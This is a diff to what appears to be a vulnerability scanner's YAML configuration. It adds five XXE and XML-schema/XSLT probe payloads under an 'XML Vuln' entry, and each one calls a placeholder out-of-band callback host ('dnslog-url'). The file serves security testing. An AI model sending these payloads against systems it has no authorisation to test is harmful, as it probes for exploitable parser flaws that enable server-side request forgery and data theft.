@@ -242,7 +242,11 @@ application:
       # 漏洞名称
       issueName: "XML Vuln"
       payloads:
-        - "<!DOCTYPE {0xbeef} PUBLIC \"any\" \"https://dnslog-url/index.dtd\">"
+        - "<!DOCTYPE doc PUBLIC \"any\" \"https://dnslog-url/index.dtd\">"
+        - "<!DOCTYPE root[<!ENTITY % sp PUBLIC  \"https://dnslog-url/xxe\">%sp;]>"
+        - "<?xml version=\"1.0\"?><!DOCTYPE root[<!ENTITY % sp PUBLIC \"https://dnslog-url/xxe\">%sp;]>"
+        - "<xs:schema elementFormDefault=\"qualified\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:myNS=\"myNS\"><xs:import namespace=\"myNS\" schemaLocation=\"https://dnslog-url/schema.xsd\"/><xs:include namespace=\"myNS2\" schemaLocation=\"https://dnslog-url/schema.xsd\"/></xs:schema>"
+        - "<xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:import href=\"https://dnslog-url/index.xsl\"/><xsl:include href=\"https://dnslog-url/index.xsl\"/><xsl:value-of select=\"document('https://dnslog-url/test.txt')\" /></xsl:stylesheet>"
 
 # dnsLog模块
 dnsLogModule:
